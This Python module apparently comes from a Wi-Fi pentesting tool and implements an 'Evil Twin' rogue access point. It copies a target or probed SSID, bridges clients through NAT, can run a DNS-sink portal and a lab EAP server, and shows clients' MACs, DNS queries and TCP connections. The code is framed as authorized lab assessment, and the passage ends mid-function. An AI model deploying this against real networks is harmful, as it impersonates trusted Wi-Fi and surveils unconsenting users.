"""Evil twin attack service functions."""

from __future__ import annotations

import json
import shutil
import subprocess
import time
from datetime import datetime
from pathlib import Path
from typing import Optional

from rich import box
from rich.console import Group
from rich.live import Live
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table

from adapters.system_tools import terminate_process
from app.ui.theme import BORDER_STYLE
from app.services.runtime_helpers import selected_network_record
from app.services.system.adapter_roles import dedicated_ap_radio, resolve_ap_interface, role_exclude_ifaces
from app.services.attacks.eap_lab import (
    DEFAULT_EAP_IDENTITY,
    DEFAULT_EAP_PASSWORD,
    DEFAULT_EAP_SSID,
    build_eap_hostapd_conf,
    eap_methods_label,
    valid_eap_identity,
    valid_eap_password,
    write_eap_lab_material,
)
from app.services.attacks.evil_twin_lab import (
    build_dnsmasq_conf,
    build_hostapd_conf,
    evaluate_isolation_check,
    parse_dnsmasq_leases,
    probe_lease_reachability,
)
from app.services.attacks.lab_portal import LabCaptivePortal, PORTAL_BIND_IP
from cleanup import LAN_CIDR, apply_evil_twin_nat, remove_evil_twin_nat, resolve_evil_twin_log_dir
from wifi.probes import preferred_evil_twin_ssid, probe_stats_from_app


def _popen_to_logs(argv: list[str], stdout_path: Path, stderr_path: Path) -> subprocess.Popen:
    """Start a child with logs on disk so PIPE buffers cannot deadlock it."""
    stdout_handle = stdout_path.open("ab")
    stderr_handle = stderr_path.open("ab")
    proc = subprocess.Popen(
        argv,
        stdin=subprocess.DEVNULL,
        stdout=stdout_handle,
        stderr=stderr_handle,
    )
    proc._wifiangel_log_handles = (stdout_handle, stderr_handle)  # type: ignore[attr-defined]
    return proc


def _close_popen_logs(proc: Optional[subprocess.Popen]) -> None:
    handles = getattr(proc, "_wifiangel_log_handles", None) if proc is not None else None
    if not handles:
        return
    for handle in handles:
        try:
            handle.close()
        except Exception:
            pass



def run_evil_twin_attack(app) -> None:
    """Run Evil Twin attack workflow."""
    run_evil_twin_attack_impl(app, mode="psk")


def run_eap_lab_ap(app) -> None:
    """Stand up a local WPA-EAP lab AP (hostapd eap_server, no RADIUS relay)."""
    run_evil_twin_attack_impl(app, mode="eap")


def run_evil_twin_attack_impl(app, mode: str = "psk") -> None:
    """Create a lab access point for authorized wireless assessment."""
    original_settings = {}
    log_dir: Optional[Path] = None
    eap_mode = mode == "eap"

    try:
        try:
            Path("/var/lib/misc/dnsmasq.leases").unlink()
        except FileNotFoundError:
            pass
        try:
            with open("/var/lib/misc/dnsmasq.leases", "w"):
                pass
            subprocess.run(["chmod", "644", "/var/lib/misc/dnsmasq.leases"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            dnsmasq_dir = Path("/var/lib/misc")
            if not dnsmasq_dir.exists():
                dnsmasq_dir.mkdir(parents=True, exist_ok=True)
                subprocess.run(["chmod", "755", str(dnsmasq_dir)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as exc:
            app.logger.log_evil_twin(f"Warning: Could not create dnsmasq.leases file: {str(exc)}")
        evil_twin_dir = app.logger.log_dir / "evil_twin"
        if evil_twin_dir.exists():
            for file in evil_twin_dir.glob("*"):
                try:
                    if file.is_dir():
                        shutil.rmtree(file)
                    else:
                        file.unlink()
                except Exception:
                    pass
    except Exception as exc:
        app.logger.log_evil_twin(f"Warning: Could not clear previous cache: {str(exc)}")

    try:
        app.console.print("[bold blue]Saving original network settings...[/]")
        try:
            resolved = app._ensure_wireless_iface_exists(app.interface_name)
        except FileNotFoundError as exc:
            app.console.print(f"[bold red]{exc}[/]")
            return
        if resolved != app.interface_name:
            app.logger.log_evil_twin(
                f"Resolved interface {app.interface_name!r} -> {resolved!r} (stale or missing name)"
            )
            app.console.print(
                f"[yellow]Using interface [cyan]{resolved}[/] "
                f"([dim]{app.interface_name}[/] is not present).[/]"
            )
            app.interface_name = resolved

        dedicated = dedicated_ap_radio(app)
        ap_iface = resolve_ap_interface(app)
        if dedicated:
            try:
                ap_iface = app._ensure_wireless_iface_exists(ap_iface)
            except FileNotFoundError as exc:
                app.console.print(f"[warning]AP interface missing ({exc}); using capture radio.[/]")
                dedicated = False
                ap_iface = app.interface_name
                app.ap_interface = None
            else:
                app.ap_interface = ap_iface
                if app.wifi_adapter.is_monitor_mode(ap_iface):
                    app.console.print(
                        "[bold blue]AP radio is in monitor mode; switching it to managed for hostapd.[/]"
                    )
                    ap_iface = app.wifi_adapter.set_managed_mode(ap_iface, restart_network_manager=False)
                    app.ap_interface = ap_iface
                app.console.print(
                    f"[info]Dual radio:[/] capture [cyan]{app.interface_name}[/] unchanged; "
                    f"AP [cyan]{ap_iface}[/]"
                )
                app.logger.log_evil_twin(f"Dual radio AP={ap_iface} capture={app.interface_name}")

        original_settings["evil_twin_ap_iface"] = ap_iface
        original_settings["evil_twin_dedicated_ap"] = dedicated

        mon_iface = app.wifi_adapter.find_monitor_interface()
        if not dedicated and mon_iface == app.interface_name:
            app.console.print(
                "[bold blue]Switching to managed mode for Evil Twin AP (hostapd requires AP/managed).[/]"
            )
            app.logger.log_evil_twin("Switching monitor interface to managed for hostapd")
            app.interface_name = app.wifi_adapter.set_managed_mode(
                app.interface_name,
                restart_network_manager=False,
            )
            ap_iface = app.interface_name
            original_settings["evil_twin_ap_iface"] = ap_iface

        original_settings["ip_forward"] = subprocess.check_output(["cat", "/proc/sys/net/ipv4/ip_forward"]).decode().strip()
        original_settings["interface_state"] = subprocess.check_output(["ip", "addr", "show", ap_iface]).decode()
        original_settings["route_table"] = subprocess.check_output(["ip", "route", "show"]).decode()
        original_settings["evil_twin_uplink"] = app._default_ipv4_uplink_interface(exclude=role_exclude_ifaces(app))
        original_settings["resolved_status"] = subprocess.run(
            ["systemctl", "is-active", "systemd-resolved"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        ).stdout.decode().strip()
        original_settings["network_manager_status"] = subprocess.run(
            ["systemctl", "is-active", "NetworkManager"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        ).stdout.decode().strip()
        original_settings["wpa_supplicant_status"] = subprocess.run(
            ["systemctl", "is-active", "wpa_supplicant"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        ).stdout.decode().strip()

        try:
            original_settings["wifi_connections"] = subprocess.check_output(
                ["nmcli", "-t", "-f", "NAME,UUID,TYPE", "connection", "show"]
            ).decode()
        except Exception:
            original_settings["wifi_connections"] = ""

        default_ssid = ""
        default_channel = "1"
        default_source = ""
        record = selected_network_record(app)
        if record:
            _bssid, network = record
            default_ssid, default_source = preferred_evil_twin_ssid(
                selected_ssid=str(network.get("ssid") or ""),
                probe_stats=probe_stats_from_app(app),
            )
            default_channel = str(network["channel"])
            app.console.print(f"\n[bold yellow]Selected network: {network['ssid']} (Channel: {default_channel})[/]")
        else:
            default_ssid, default_source = preferred_evil_twin_ssid(
                selected_ssid="",
                probe_stats=probe_stats_from_app(app),
            )

        if eap_mode:
            default_ssid = DEFAULT_EAP_SSID
            default_source = "eap_lab"
            app.console.print(
                "[info]EAP lab AP uses a local hostapd EAP server (PEAP/TTLS). "
                "It does not proxy or relay to an external RADIUS.[/]"
            )

        if default_source == "probe" and default_ssid:
            app.console.print(
                f"[info]No broadcast target SSID; defaulting Evil Twin SSID to most-probed name "
                f"[cyan]{default_ssid}[/]"
            )
        stats = probe_stats_from_app(app)
        if stats:
            preview = Table(
                show_header=True,
                header_style="bold magenta",
                box=box.MINIMAL,
                border_style=BORDER_STYLE,
                title="[bold blue]Probe SSIDs[/]",
            )
            preview.add_column("SSID", style="yellow")
            preview.add_column("Stations", style="green", justify="right")
            for stat in stats[:8]:
                preview.add_row(stat.ssid, str(stat.station_count))
            app.console.print(preview)

        ssid_prompt = "Enter SSID for the EAP lab AP" if eap_mode else "Enter SSID for the Evil Twin"
        ssid = Prompt.ask(ssid_prompt, default=default_ssid)
        if not ssid and default_ssid:
            ssid = default_ssid
            app.console.print(f"[bold cyan]Using default SSID: {ssid}[/]")
        if not _valid_hostapd_ssid(ssid):
            app.console.print("[bold red]Invalid SSID. Use 1-32 bytes without line breaks.[/]")
            return

        channel_input = Prompt.ask("Enter channel (1-11)", default=default_channel)
        try:
            channel = int(channel_input)
            if channel < 1 or channel > 11:
                app.console.print("[bold yellow]Invalid channel, using default channel 1[/]")
                channel = 1
        except (TypeError, ValueError):
            app.console.print("[bold yellow]Invalid channel, using default channel 1[/]")
            channel = 1

        use_wpa2 = False
        wpa_passphrase = ""
        eap_identity = DEFAULT_EAP_IDENTITY
        eap_password = DEFAULT_EAP_PASSWORD
        if eap_mode:
            eap_identity = Prompt.ask("Lab EAP identity", default=DEFAULT_EAP_IDENTITY)
            if not valid_eap_identity(eap_identity):
                app.console.print("[bold red]Invalid EAP identity. Use 1-64 characters without quotes or line breaks.[/]")
                return
            eap_password = Prompt.ask(
                "Lab EAP password",
                default=DEFAULT_EAP_PASSWORD,
                password=True,
            )
            if not valid_eap_password(eap_password):
                app.console.print("[bold red]Invalid EAP password. Use 1-63 characters without quotes or line breaks.[/]")
                return
        else:
            use_wpa2 = Prompt.ask("Enable WPA2-PSK security? (y/n)", choices=["y", "n"]) == "y"
            if use_wpa2:
                wpa_passphrase = Prompt.ask("Enter WPA2 passphrase (8-63 characters)")
                if not _valid_wpa_passphrase(wpa_passphrase):
                    app.console.print("[bold red]Invalid WPA2 passphrase. Use 8-63 characters without line breaks.[/]")
                    return

        isolate_clients = (
            Prompt.ask("Enable client isolation (block STA-to-STA)? (y/n)", choices=["y", "n"], default="n") == "y"
        )
        enable_portal = (
            Prompt.ask(
                "Enable lab captive portal (HTTP + DNS sink, no password form)? (y/n)",
                choices=["y", "n"],
                default="n",
            )
            == "y"
        )

        uplink_precheck = original_settings.get("evil_twin_uplink")
        uplink_ok, uplink_reason = app._evil_twin_nonwifi_internet_uplink_ok(uplink_precheck)
        if not uplink_ok:
            if uplink_reason == "no_uplink":
                app.logger.log_evil_twin("Precheck: no uplink excluding AP iface")
            else:
                app.logger.log_evil_twin(f"Precheck: uplink {uplink_precheck!r} is wireless")
        elif uplink_precheck:
            app.console.print(
                f"[success]Non-Wi-Fi uplink OK:[/] [cyan]{uplink_precheck}[/] "
                "(clients can use NAT/DNS if routing stays up after services stop)."
            )

        app.logger.log_evil_twin(
            "Attack started",
            ssid=ssid,
            channel=channel,
            security="WPA2-EAP" if eap_mode else ("WPA2" if use_wpa2 else "Open"),
            isolation=isolate_clients,
            portal=enable_portal,
        )
        log_dir = app.logger.log_dir / "evil_twin"
        log_dir.mkdir(exist_ok=True)
        original_settings["evil_twin_isolate"] = isolate_clients
        original_settings["evil_twin_portal"] = enable_portal
        original_settings["evil_twin_eap"] = eap_mode

        if eap_mode:
            if not shutil.which("openssl"):
                app.console.print("[bold red]openssl is required to create the EAP lab certificate.[/]")
                return
            try:
                material = write_eap_lab_material(
                    log_dir / "eap",
                    identity=eap_identity,
                    password=eap_password,
                )
            except Exception as exc:
                app.console.print(f"[bold red]Could not create EAP lab material: {exc}[/]")
                app.logger.log_evil_twin(f"EAP lab material failed: {exc}", error=True)
                return
            hostapd_conf = build_eap_hostapd_conf(
                ap_iface=ap_iface,
                ssid=ssid,
                channel=channel,
                eap_user_file=material.user_file,
                ca_cert=material.ca_cert,
                server_cert=material.server_cert,
                private_key=material.private_key,
                isolate_clients=isolate_clients,
            )
            app.console.print(
                f"[info]Lab EAP identity [cyan]{eap_identity}[/]. "
                "Test STAs must trust this AP's short-lived self-signed cert (or skip validation).[/]"
            )
        else:
            hostapd_conf = build_hostapd_conf(
                ap_iface=ap_iface,
                ssid=ssid,
                channel=channel,
                wpa_passphrase=wpa_passphrase if use_wpa2 else None,
                isolate_clients=isolate_clients,
            )
        dnsmasq_conf = build_dnsmasq_conf(
            ap_iface=ap_iface,
            log_dir=log_dir,
            portal=enable_portal,
        )

        app.console.print("[bold blue]Preparing network environment...[/]")
        app.logger.log_evil_twin("Stopping network services")
        subprocess.run(["systemctl", "stop", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["systemctl", "stop", "wpa_supplicant"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["killall", "dnsmasq"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["killall", "hostapd"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)

        uplink = original_settings.get("evil_twin_uplink")
        if uplink and uplink not in role_exclude_ifaces(app):
            app.console.print(f"[bold blue]Refreshing DHCP on uplink {uplink} (internet exit)...[/]")
            app.logger.log_evil_twin(f"Renewing DHCP on uplink {uplink} after stopping NetworkManager")
            app._renew_dhcp_on_interface(uplink)
            time.sleep(2)
            uplink_live = app._default_ipv4_uplink_interface(exclude=role_exclude_ifaces(app))
            if uplink_live:
                uplink = uplink_live
                original_settings["evil_twin_uplink"] = uplink
            else:
                app.console.print(
                    "[yellow]No default route after NM stop. Use Ethernet (or second NIC) with DHCP for internet uplink.[/]"
                )

        app.console.print("[bold blue]Configuring network interface...[/]")
        app.logger.log_evil_twin("Configuring network interface")
        subprocess.run(["rfkill", "unblock", "all"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", ap_iface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "addr", "flush", "dev", ap_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", ap_iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "addr", "add", "192.168.1.1/24", "dev", ap_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)

        lab_portal = None
        if enable_portal:
            portal_log = log_dir / "portal.jsonl"
            try:
                lab_portal = LabCaptivePortal(PORTAL_BIND_IP, portal_log)
                lab_portal.start()
                original_settings["lab_portal"] = lab_portal
                app.console.print(
                    f"[success]Lab captive portal[/] on [cyan]http://{PORTAL_BIND_IP}/[/] "
                    f"(DNS sink + HTTP DNAT, hits → {portal_log})"
                )
                app.logger.log_evil_twin(f"Lab captive portal listening on {PORTAL_BIND_IP}:80")
            except OSError as exc:
                lab_portal = None
                original_settings["lab_portal"] = None
                app.console.print(f"[warning]Could not bind lab portal: {exc}[/]")
                app.logger.log_evil_twin(f"Lab portal bind failed: {exc}", error=True)

        hostapd_path = log_dir / "hostapd.conf"
        dnsmasq_path = log_dir / "dnsmasq.conf"
        with open(hostapd_path, "w") as f:
            f.write(hostapd_conf)
        hostapd_path.chmod(0o600)
        with open(dnsmasq_path, "w") as f:
            f.write(dnsmasq_conf)
        dnsmasq_path.chmod(0o600)

        app.console.print("[bold blue]Starting Evil Twin access point...[/]")
        app.logger.log_evil_twin("Starting access point")
        hostapd_stdout = log_dir / "hostapd.stdout.log"
        hostapd_stderr = log_dir / "hostapd.stderr.log"
        dnsmasq_stdout = log_dir / "dnsmasq.stdout.log"
        dnsmasq_stderr = log_dir / "dnsmasq.stderr.log"
        hostapd_proc = _popen_to_logs(["hostapd", str(hostapd_path)], hostapd_stdout, hostapd_stderr)
        original_settings["hostapd_proc"] = hostapd_proc
        time.sleep(3)
        if hostapd_proc.poll() is not None:
            app.logger.log_evil_twin("Failed to start hostapd", error=True)
            raise Exception("Failed to start hostapd. Check your wireless adapter.")

        app.logger.log_evil_twin("Starting DHCP server")
        dnsmasq_proc = _popen_to_logs(
            ["dnsmasq", "-C", str(dnsmasq_path), "-d"],
            dnsmasq_stdout,
            dnsmasq_stderr,
        )
        original_settings["dnsmasq_proc"] = dnsmasq_proc
        time.sleep(2)
        if dnsmasq_proc.poll() is not None:
            app.logger.log_evil_twin("Failed to start dnsmasq", error=True)
            raise Exception("Failed to start dnsmasq. Check configuration.")

        subprocess.run(["sysctl", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        exclude = role_exclude_ifaces(app)
        wan_iface = original_settings.get("evil_twin_uplink")
        if not wan_iface or wan_iface in exclude:
            wan_iface = app._default_ipv4_uplink_interface(exclude=exclude)
        if wan_iface in exclude:
            wan_iface = None
        if wan_iface and not (Path("/sys/class/net") / wan_iface).is_dir():
            wan_iface = None

        evil_twin_lan = LAN_CIDR
        app.logger.log_evil_twin("Configuring scoped iptables chains for Evil Twin internet sharing")
        nat_installed = False
        try:
            apply_evil_twin_nat(
                ap_iface=ap_iface,
                wan_iface=wan_iface,
                lan_cidr=evil_twin_lan,
                portal=enable_portal,
                isolate_clients=isolate_clients,
            )
            nat_installed = bool(wan_iface)
        except Exception as exc:
            app.logger.log_evil_twin(f"Scoped iptables NAT setup failed: {exc}", error=True)
            app.console.print(f"[warning]Could not install scoped NAT rules: {exc}[/]")

        if nat_installed:
            app.console.print(
                f"[success]Internet sharing on[/] — NAT [dim]{evil_twin_lan}[/] → [cyan]{wan_iface}[/] "
                f"(AP [cyan]{ap_iface}[/], scoped WIFIANGEL_ET chains)"
            )
            app.logger.log_evil_twin(
                f"NAT/forward: LAN {evil_twin_lan} via AP {ap_iface} masq out {wan_iface}"
            )
        elif not wan_iface:
            app.console.print(
                "[warning]No WAN uplink detected — clients join the lab AP but may not reach the internet. "
                "Connect Ethernet (default route) or a second online interface.[/]"
            )
            app.logger.log_evil_twin("No WAN iface; NAT skipped (no global FORWARD ACCEPT)")

        if isolate_clients:
            app.console.print("[info]Client isolation on: hostapd ap_isolate=1 and FORWARD DROP on AP iface.[/]")
        if enable_portal and not lab_portal:
            app.console.print("[warning]Portal selected but HTTP listener is not running.[/]")

        try:
            acct = subprocess.run(
                ["sysctl", "-n", "net.netfilter.nf_conntrack_acct"],
                capture_output=True,
                text=True,
                timeout=3,
            )
            original_settings["nf_conntrack_acct"] = acct.stdout.strip() if acct.returncode == 0 else None
            subprocess.run(
                ["sysctl", "-w", "net.netfilter.nf_conntrack_acct=1"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except Exception:
            original_settings["nf_conntrack_acct"] = None

        dnsmasq_log = log_dir / "dnsmasq.log"
        if not dnsmasq_log.exists():
            dnsmasq_log.touch()

        with Live(refresh_per_second=4) as live:
            start_time = time.time()
            clients_connected = {}
            tcp_connections: list[tuple[str, str, str]] = []
            tcp_poll = {"last": 0.0}
            isolation_check = evaluate_isolation_check([], {}, isolated=isolate_clients)
            cache_dir = Path("/tmp/wifiangel_evil_twin")
            cache_dir.mkdir(exist_ok=True)
            session_file = cache_dir / f"clients_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            leases_file = log_dir / "dnsmasq.leases"
            try:
                leases_file.touch(exist_ok=True)
                subprocess.run(["chmod", "644", str(leases_file)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception as exc:
                app.logger.log_evil_twin(f"Warning: Could not create dnsmasq.leases file: {str(exc)}")

            while True:
                status_table = Table(
                    show_header=True,
                    header_style="bold magenta",
                    box=box.MINIMAL,
                    border_style=BORDER_STYLE,
                    title="[bold blue]EAP lab AP[/]" if eap_mode else "[bold blue]Evil Twin Status[/]",
                )
                status_table.add_column("SSID", style="cyan")
                status_table.add_column("Channel", style="green")
                status_table.add_column("Security", style="yellow")
                status_table.add_column("AP Status", style="magenta")
                status_table.add_column("Running Time", style="cyan")
                elapsed = int(time.time() - start_time)
                time_str = f"{elapsed//3600:02d}:{(elapsed%3600)//60:02d}:{elapsed%60:02d}"
                if eap_mode:
                    security_str = eap_methods_label()
                else:
                    security_str = f"WPA2-PSK ({wpa_passphrase})" if use_wpa2 else "Open"
                ap_status = "[bold green]Active"
                if hostapd_proc.poll() is not None or dnsmasq_proc.poll() is not None:
                    ap_status = "[bold red]Error"
                    app.logger.log_evil_twin("Service crashed, attempting restart")
                    if hostapd_proc.poll() is not None:
                        _close_popen_logs(hostapd_proc)
                        hostapd_proc = _popen_to_logs(
                            ["hostapd", str(hostapd_path)],
                            hostapd_stdout,
                            hostapd_stderr,
                        )
                        original_settings["hostapd_proc"] = hostapd_proc
                    if dnsmasq_proc.poll() is not None:
                        _close_popen_logs(dnsmasq_proc)
                        dnsmasq_proc = _popen_to_logs(
                            ["dnsmasq", "-C", str(dnsmasq_path), "-d"],
                            dnsmasq_stdout,
                            dnsmasq_stderr,
                        )
                        original_settings["dnsmasq_proc"] = dnsmasq_proc
                status_table.add_row(ssid, str(channel), security_str, ap_status, time_str)

                now = time.time()
                if now - tcp_poll["last"] >= 5.0:
                    tcp_poll["last"] = now
                    try:
                        tcp_connections = app._evil_twin_fetch_established_tcp_for_lan()
                    except Exception:
                        tcp_connections = []
                    if isolate_clients:
                        try:
                            lease_text = (
                                leases_file.read_text(encoding="utf-8", errors="replace")
                                if leases_file.exists()
                                else ""
                            )
                            parsed_leases = parse_dnsmasq_leases(lease_text)
                            ping_ok = probe_lease_reachability(
                                [item.ip for item in parsed_leases],
                                ap_iface,
                            )
                            isolation_check = evaluate_isolation_check(
                                parsed_leases,
                                ping_ok,
                                isolated=True,
                            )
                        except Exception:
                            pass

                tcp_table = Table(show_header=True, header_style="bold blue", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Active TCP ESTABLISHED Connections[/] (refresh ~5s, uses ss/netstat)")
                tcp_table.add_column("Local Address", style="cyan")
                tcp_table.add_column("Remote Address", style="green")
                tcp_table.add_column("State", style="yellow")
                for local, remote, state in tcp_connections:
                    tcp_table.add_row(local, remote, state)

                dns_table = Table(show_header=True, header_style="bold green", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Recent DNS Queries[/]")
                dns_table.add_column("Time", style="cyan")
                dns_table.add_column("Client IP", style="green")
                dns_table.add_column("Query", style="yellow")
                dns_table.add_column("Type", style="magenta")
                if dnsmasq_log.exists():
                    try:
                        with open(dnsmasq_log, "r", errors="replace") as f:
                            dns_parsed = app._evil_twin_parse_dnsmasq_query_lines(f.readlines())
                        for time_hint, client_ip, query_name, query_type in dns_parsed:
                            dns_table.add_row(time_hint, client_ip, query_name, query_type)
                    except OSError:
                        pass

                clients_table = Table(show_header=True, header_style="bold yellow", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Connected Clients[/]")
                clients_table.add_column("MAC Address", style="cyan")
                clients_table.add_column("IP Address", style="green")
                clients_table.add_column("Connected Since", style="yellow")
                clients_table.add_column("Data Transferred", style="magenta")
                try:
                    leases_file = log_dir / "dnsmasq.leases"
                    if leases_file.exists():
                        with open(leases_file, "r") as f:
                            leases = f.readlines()
                            current_clients = {}
                            for lease in leases:
                                parts = lease.split()
                                if len(parts) >= 5:
                                    mac = parts[1]
                                    ip = parts[2]
                                    hostname = parts[3]
                                    if ip.startswith("192.168.1."):
                                        prior = clients_connected.get(mac)
                                        if prior and prior.get("ip") == ip and prior.get("connected_since"):
                                            first_seen = prior["connected_since"]
                                        else:
                                            first_seen = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                                        current_clients[mac] = {"ip": ip, "hostname": hostname, "connected_since": first_seen}
                                        if mac not in clients_connected:
                                            app.logger.log_evil_twin(f"New client connected: {mac} ({ip})")
                            clients_connected = current_clients
                            try:
                                with open(session_file, "w") as f:
                                    json.dump(clients_connected, f)
                            except Exception:
                                pass
                except Exception:
                    pass

                for mac, details in clients_connected.items():
                    b = app._evil_twin_nf_conntrack_bytes_for_ip(details["ip"])
                    clients_table.add_row(
                        mac,
                        details["ip"],
                        details["connected_since"],
                        app._evil_twin_format_bytes(b),
                    )

                lab_table = Table(
                    show_header=True,
                    header_style="bold cyan",
                    box=box.MINIMAL,
                    border_style=BORDER_STYLE,
                    title="[bold blue]Lab portal / isolation[/]",
                )
                lab_table.add_column("Portal", style="cyan")
                lab_table.add_column("HTTP hits", style="green", justify="right")
                lab_table.add_column("Isolation", style="yellow")
                lab_table.add_column("Two-lease check", style="magenta")
                if lab_portal:
                    portal_state = "HTTP + DNS sink"
                    hit_count = str(lab_portal.hit_count)
                elif enable_portal:
                    portal_state = "failed"
                    hit_count = "0"
                else:
                    portal_state = "off"
                    hit_count = "0"
                iso_label = "on" if isolate_clients else "off"
                lab_table.add_row(
                    portal_state,
                    hit_count,
                    iso_label,
                    f"{isolation_check.status}: {isolation_check.detail}",
                )

                live.update(
                    Group(
                        status_table,
                        Panel(clients_table, border_style=BORDER_STYLE, box=box.MINIMAL),
                        Panel(lab_table, border_style=BORDER_STYLE, box=box.MINIMAL),
                        Panel(dns_table, border_style=BORDER_STYLE, box=box.MINIMAL),
                        Panel(tcp_table, border_style=BORDER_STYLE, box=box.MINIMAL),
                    )
                )
                time.sleep(1)
    except KeyboardInterrupt:
        app.logger.log_evil_twin("Attack stopped by user")
        label = "EAP lab AP" if eap_mode else "Evil Twin attack"
        app.console.print(f"\n[bold yellow]{label} stopped by user.[/]")
    except Exception as exc:
        app.logger.log_evil_twin(f"Error during attack: {str(exc)}", error=True)
        label = "EAP lab AP" if eap_mode else "Evil Twin attack"
        app.console.print(f"\n[bold red]Error during {label}: {str(exc)}[/]")
    finally:
        app.cleanup_evil_twin(original_settings, log_dir)
        app.current_menu = "attack"


def cleanup_evil_twin(app, original_settings, log_dir=None) -> None:
    """Cleanup Evil Twin attack resources."""
    log_dir = resolve_evil_twin_log_dir(app.logger.log_dir, log_dir)
    app.console.print("[bold blue]Cleaning up and restoring network settings...[/]")
    app.logger.log_evil_twin("Starting cleanup process")

    try:
        portal = original_settings.get("lab_portal")
        if portal is not None:
            try:
                portal.stop()
            except Exception:
                pass
            original_settings["lab_portal"] = None

        cache_dir = Path("/tmp/wifiangel_evil_twin")
        if cache_dir.exists():
            try:
                shutil.rmtree(cache_dir)
            except Exception:
                pass

        try:
            leases_file = log_dir / "dnsmasq.leases"
            if leases_file.exists():
                with open(leases_file, "w", encoding="utf-8"):
                    pass
                subprocess.run(["chmod", "644", str(leases_file)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

        app.logger.log_evil_twin("Stopping session hostapd/dnsmasq processes")
        for key in ("hostapd_proc", "dnsmasq_proc"):
            proc = original_settings.get(key)
            terminate_process(proc, timeout=3)
            _close_popen_logs(proc)
            original_settings[key] = None

        if "ip_forward" in original_settings:
            app.logger.log_evil_twin("Resetting IP forwarding")
            subprocess.run(
                ["sysctl", f"net.ipv4.ip_forward={original_settings['ip_forward']}"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

        prev_acct = original_settings.get("nf_conntrack_acct")
        if prev_acct is not None:
            subprocess.run(
                ["sysctl", "-w", f"net.netfilter.nf_conntrack_acct={prev_acct}"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

        app.logger.log_evil_twin("Removing scoped Evil Twin iptables chains")
        try:
            remove_evil_twin_nat()
        except Exception:
            app.logger.log_evil_twin("Failed to remove WIFIANGEL_ET iptables chains", error=True)

        ap_iface = original_settings.get("evil_twin_ap_iface") or app.interface_name
        dedicated = bool(original_settings.get("evil_twin_dedicated_ap"))
        restore_iface = ap_iface if dedicated else app.interface_name

        if not dedicated and "mon" in str(restore_iface):
            try:
                subprocess.run(["airmon-ng", "stop", restore_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                app.interface_name = str(restore_iface).replace("mon", "")
                restore_iface = app.interface_name
            except Exception:
                app.logger.log_evil_twin("Failed to stop monitor mode using airmon-ng", error=True)

        subprocess.run(["ip", "link", "set", restore_iface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["iw", restore_iface, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", restore_iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if original_settings.get("resolved_status") == "active":
            subprocess.run(["systemctl", "restart", "systemd-resolved"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if original_settings.get("wpa_supplicant_status") == "active":
            subprocess.run(["systemctl", "restart", "wpa_supplicant"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if original_settings.get("network_manager_status") == "active":
            subprocess.run(["systemctl", "restart", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        app.console.print("[success]Network settings restored successfully.[/]")
        if dedicated:
            app.console.print(f"[success]AP interface [cyan]{restore_iface}[/] set to managed. Capture radio unchanged.[/]")
        else:
            app.console.print("[success]Interface switched back to managed mode.[/]")
        app.console.print("[info]You can now manually connect to your WiFi network.[/]")
    except Exception as exc:
        app.logger.log_evil_twin(f"Error during cleanup: {str(exc)}", error=True)
        app.console.print(f"[bold red]Error during cleanup: {str(exc)}[/]")
    finally:
        if original_settings.get("evil_twin_dedicated_ap"):
            _ensure_service_active(app, "NetworkManager", warn="NetworkManager")
        else:
            verify_network_services(app)


def verify_network_services(app) -> None:
    """Verify that network services are running correctly."""
    try:
        _ensure_service_active(app, "NetworkManager", warn="NetworkManager")
        _ensure_service_active(app, "wpa_supplicant", warn="wpa_supplicant")
        _ensure_managed_mode(app)
    except Exception as exc:
        app.logger.error(f"Error during network service verification: {str(exc)}")
        app.console.print("[error]Could not verify network services status[/]")


def _ensure_service_active(app, service_name: str, *, warn: str) -> None:
    try:
        status = subprocess.run(
            ["systemctl", "is-active", service_name],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=5,
        ).stdout.decode().strip()
        if status == "active":
            return
        app.console.print(f"[warning]{warn} is not active, attempting to restart...[/]")
        try:
            subprocess.run(["systemctl", "restart", service_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
            time.sleep(2)
            status = subprocess.run(
                ["systemctl", "is-active", service_name],
                stdout=subprocess.PIPE,
